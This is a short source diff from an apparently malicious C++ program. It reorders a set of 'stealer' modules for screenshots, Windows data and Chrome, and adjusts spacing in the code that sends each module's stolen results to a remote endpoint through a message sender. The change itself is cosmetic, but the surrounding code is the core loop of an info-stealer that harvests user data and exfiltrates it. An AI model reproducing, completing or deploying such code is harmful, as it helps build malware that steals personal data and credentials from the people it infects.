@@ -122,8 +122,8 @@ asio::awaitable<void> co_main()
     };
 
     std::vector<std::unique_ptr<base_stealer_t>> stealers;
-    stealers.emplace_back(std::make_unique<win_stealer_t>());
     stealers.emplace_back(std::make_unique<srceenshot_stealer_t>());
+    stealers.emplace_back(std::make_unique<win_stealer_t>());
     stealers.emplace_back(std::make_unique<chrome_stealer_t>());
 
     std::vector<asio::awaitable<void>> tasks;
@@ -133,7 +133,7 @@ asio::awaitable<void> co_main()
         {
             const auto result = co_await st->steal();
             const auto response = co_await sender->send_message(result);
-            if(!response.at("ok").as_bool())
+            if (!response.at("ok").as_bool())
                 DLOG(response.at("description").as_string());
         };
 
